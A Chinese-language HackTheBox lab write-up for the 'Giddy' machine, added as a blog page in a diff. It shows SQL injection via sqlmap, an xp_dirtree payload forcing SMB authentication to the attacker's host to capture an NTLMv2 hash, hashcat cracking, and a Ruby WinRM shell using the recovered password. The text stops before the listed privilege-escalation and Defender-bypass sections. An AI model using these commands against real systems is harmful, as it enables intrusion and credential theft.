@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>HTB: Giddy - T0x1c</title>
+
+  
+    <meta name="description" content="Giddy是一个中等难度的靶机，知识点涉及SQL注入、NTLM哈希破解、WinRM登陆、unifivideo服务提权、Windows Defender绕过、等。通过SQL注入获取普通用户的NTLM哈希，破解后登陆目标主机，绕过Windows Defender利用unifivideo服务完成提权。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB: Giddy">
+<meta property="og:url" content="https://toxic80l.github.io/post/ea353df5/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="Giddy是一个中等难度的靶机，知识点涉及SQL注入、NTLM哈希破解、WinRM登陆、unifivideo服务提权、Windows Defender绕过、等。通过SQL注入获取普通用户的NTLM哈希，破解后登陆目标主机，绕过Windows Defender利用unifivideo服务完成提权。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0270.gif">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-10%20%E4%B8%8B%E5%8D%882.56.18.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-10%20%E4%B8%8B%E5%8D%883.40.53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-10%20%E4%B8%8B%E5%8D%883.41.48.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-10%20%E4%B8%8B%E5%8D%884.04.16.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-10%20%E4%B8%8B%E5%8D%883.45.24.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-10%20%E4%B8%8B%E5%8D%883.45.46.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-10%20%E4%B8%8B%E5%8D%884.46.43.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-10%20%E4%B8%8B%E5%8D%884.49.01.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-10%20%E4%B8%8B%E5%8D%884.53.17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%881.19.10.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%881.22.14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%881.28.11.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%881.39.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%881.39.51.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%881.48.17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%881.52.58.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%881.56.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%882.01.57.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%882.37.54.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%883.18.43.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%883.21.29.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%883.30.55.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%883.35.29.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%882.20.27.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%883.48.42.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%884.05.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%889.43.55.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%8810.27.22.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%8811.06.02.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%8810.51.03.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%8811.08.12.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%8811.10.33.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%8811.31.42.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8B%E5%8D%883.06.41.png">
+<meta property="article:published_time" content="2022-02-17T02:55:21.000Z">
+<meta property="article:modified_time" content="2022-02-17T09:54:00.800Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="靶机">
+<meta property="article:tag" content="smb">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="unifivideo">
+<meta property="article:tag" content="NTLM">
+<meta property="article:tag" content="Windows Defender绕过">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0270.gif">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BE%A6%E6%9F%A5"><span class="toc-text">0x01 侦查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-text">端口探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#80-443%E7%AB%AF%E5%8F%A3"><span class="toc-text">80&#x2F;443端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">SQL注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smb%E8%8E%B7%E5%8F%96NTLM%E5%93%88%E5%B8%8C"><span class="toc-text">smb获取NTLM哈希</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#smbserver"><span class="toc-text">smbserver</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#responder"><span class="toc-text">responder</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM%E5%93%88%E5%B8%8C%E7%A0%B4%E8%A7%A3"><span class="toc-text">NTLM哈希破解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%B8%8A%E7%BA%BF-stacy"><span class="toc-text">0x02 上线[stacy]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Powershell%E7%BD%91%E9%A1%B5%E8%AE%BF%E9%97%AE"><span class="toc-text">Powershell网页访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WinRM%E7%99%BB%E9%99%86"><span class="toc-text">WinRM登陆</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-system"><span class="toc-text">0x03 权限提升[system]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unifivideo%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-text">unifivideo提权漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEunifivideo%E6%9C%8D%E5%8A%A1"><span class="toc-text">寻找unifivideo服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Defender%E9%99%90%E5%88%B6"><span class="toc-text">Windows Defender限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Defender%E7%BB%95%E8%BF%87"><span class="toc-text">Windows Defender绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Ebowla"><span class="toc-text">Ebowla</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Phantom-Evasion"><span class="toc-text">Phantom-Evasion</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF"><span class="toc-text">MSF</span></a></li></ol></li></ol></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/HackTheBox/">HackTheBox</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2022-02-17T02:55:21.000Z">2022-02-17</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>HTB: Giddy</span></h1>
+<p>Giddy是一个中等难度的靶机，知识点涉及SQL注入、NTLM哈希破解、WinRM登陆、unifivideo服务提权、Windows Defender绕过、等。通过SQL注入获取普通用户的NTLM哈希，破解后登陆目标主机，绕过Windows Defender利用unifivideo服务完成提权。感兴趣的同学可以在HackTheBox中进行学习。</p>
+<span id="more"></span>
+<span class="tag-plugin emoji"><img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0270.gif" style="height:3em" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></span>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-10%20%E4%B8%8B%E5%8D%882.56.18.png" alt="截屏2021-11-10 下午2.56.18"></p>
+<h2 id="0x01-侦查"><a href="#0x01-侦查" class="headerlink" title="0x01 侦查"></a>0x01 侦查</h2><h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><p>首先通过nmap对目标进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -p- -sV -sC -A 10.10.10.104 -oA nmap_Giddy</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-10%20%E4%B8%8B%E5%8D%883.40.53.png" alt="截屏2021-11-10 下午3.40.53"></p>
+<p>扫描结果吸纳是目标开放了80、443、3389、5985端口</p>
+<h4 id="80-443端口"><a href="#80-443端口" class="headerlink" title="80/443端口"></a>80/443端口</h4><p>这两个端口都对应着同一站点<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-10%20%E4%B8%8B%E5%8D%883.41.48.png" alt="截屏2021-11-10 下午3.41.48"></p>
+<p>对站点进行目录扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.104 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-10%20%E4%B8%8B%E5%8D%884.04.16.png" alt="截屏2021-11-10 下午4.04.16"></p>
+<p>存在目录<code>/remote</code>、<code>/mvc</code>，访问<code>/remote</code>出现<code>Windows Powershell Web Access</code>登陆信息<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-10%20%E4%B8%8B%E5%8D%883.45.24.png" alt="截屏2021-11-10 下午3.45.24"><br>而目录<code>/mvc</code>是一个在线商店界面<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-10%20%E4%B8%8B%E5%8D%883.45.46.png" alt="截屏2021-11-10 下午3.45.46"></p>
+<h3 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h3><p>在<code>/mvc/search.aspx</code>中搜索<code>1&#39;</code>出现数据库报错信息<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-10%20%E4%B8%8B%E5%8D%884.46.43.png" alt="截屏2021-11-10 下午4.46.43"><br>与此同时访问<code>/mvc/Product.aspx?ProductSubCategoryID=1&#39;</code>时也出现该报错信息<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-10%20%E4%B8%8B%E5%8D%884.49.01.png" alt="截屏2021-11-10 下午4.49.01"></p>
+<p>以上两点均说明目标站点可能存在SQL注入漏洞，首先使用 sqlmap 对其进行测试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryID=1* --dbms mssql --risk 3 --level 5 --batch --dbs </span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-10%20%E4%B8%8B%E5%8D%884.53.17.png" alt="截屏2021-11-10 下午4.53.17"><br>结果显示目标存在SQL注入漏洞，</p>
+<h3 id="smb获取NTLM哈希"><a href="#smb获取NTLM哈希" class="headerlink" title="smb获取NTLM哈希"></a>smb获取NTLM哈希</h3><p>使用 SQL server 堆叠查询进行 smb 连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; Exec master ..xp_dirtree &#x27;\\10.10.14.17\mac&#x27;; --</span><br></pre></td></tr></table></figure>
+<p>构造地址如下并直接访问</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryID=1;%20Exec%20master%20..xp_dirtree%20%27\\10.10.14.17\mac%27;%20--</span><br></pre></td></tr></table></figure>
+<p>监听请求则可以使用 impacket-smbserver 脚本或 responder</p>
+<h4 id="smbserver"><a href="#smbserver" class="headerlink" title="smbserver"></a>smbserver</h4><p>使用 smbserver 设置共享目录并开启监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbserver mac .</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%881.19.10.png" alt="截屏2021-11-11 上午1.19.10"></p>
+<h4 id="responder"><a href="#responder" class="headerlink" title="responder"></a>responder</h4><p>也可以使用 responder 监听<code>tun0</code>网卡</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I tun0</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%881.22.14.png" alt="截屏2021-11-11 上午1.22.14"><br>以上两种方式均可获取 NTLM hash 值</p>
+<h3 id="NTLM哈希破解"><a href="#NTLM哈希破解" class="headerlink" title="NTLM哈希破解"></a>NTLM哈希破解</h3><p>使用 hashcat 破解获取到的 NTLMv2 哈希</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 stacy.ntlmv2.hash /usr/share/wordlists/rockyou.txt -o stacy.ntlmv2.cracked --force</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%881.28.11.png" alt="截屏2021-11-11 上午1.28.11"><br>成功破解密码为<code>xNnWo6272k7x</code></p>
+<h2 id="0x02-上线-stacy"><a href="#0x02-上线-stacy" class="headerlink" title="0x02 上线[stacy]"></a>0x02 上线[stacy]</h2><h3 id="Powershell网页访问"><a href="#Powershell网页访问" class="headerlink" title="Powershell网页访问"></a>Powershell网页访问</h3><p>访问 powershell 登录界面<code>https://10.10.10.104/Remote/en-US/logon.aspx?ReturnUrl=%2fremote</code>，输入账号密码进行登陆<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%881.39.07.png" alt="截屏2021-11-11 上午1.39.07"><br>成功登录并能够执行命令<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/ea353df5/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%881.39.51.png" alt="截屏2021-11-11 上午1.39.51"></p>
+<h3 id="WinRM登陆"><a href="#WinRM登陆" class="headerlink" title="WinRM登陆"></a>WinRM登陆</h3><p>由于5985端口开放，我们可以使用 WinRM 脚本进行登陆，当然在此之前需要修改一些配置信息<br><strong>工具地址：<a target="_blank" rel="noopener" href="https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb">https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb</a></strong></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;winrm&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: Alamot</span></span><br><span class="line"></span><br><span class="line">conn = WinRM::Connection.new(</span><br><span class="line">  <span class="symbol">endpoint:</span> <span class="string">&#x27;http://10.10.10.104:5985/wsman&#x27;</span>,</span><br><span class="line">  <span class="symbol">transport:</span> <span class="symbol">:plaintext</span>,</span><br><span class="line">  <span class="symbol">user:</span> <span class="string">&#x27;stacy&#x27;</span>,</span><br><span class="line">  <span class="symbol">password:</span> <span class="string">&#x27;xNnWo6272k7x&#x27;</span>,</span><br><span class="line">  <span class="symbol">:no_ssl_peer_verification</span> =&gt; <span class="literal">true</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">command=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">conn.shell(<span class="symbol">:powershell</span>) <span class="keyword">do</span> <span class="params">|shell|</span></span><br><span class="line">    <span class="keyword">until</span> command == <span class="string">&quot;exit\n&quot;</span> <span class="keyword">do</span></span><br><span class="line">        output = shell.run(<span class="string">&quot;-join($id,&#x27;PS &#x27;,$(whoami),&#x27;@&#x27;,$env:computername,&#x27; &#x27;,$((gi $pwd).Name),&#x27;&gt; &#x27;)&quot;</span>)                                                                                                         </span><br><span class="line">        print(output.output.chomp)</span><br><span class="line">        command = gets</span><br><span class="line">        output = shell.run(command) <span class="keyword">do</span> <span class="params">|stdout, stderr|</span></span><br><span class="line">            STDOUT.print stdout</span><br><span class="line">            STDERR.print stderr</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    puts <span class="string">&quot;Exiting with code <span class="subst">#&#123;output.exitcode&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<p>使用 ruby 执行该脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby winrm_shell.rb</span><br></pre></td></tr></table></figure>
+
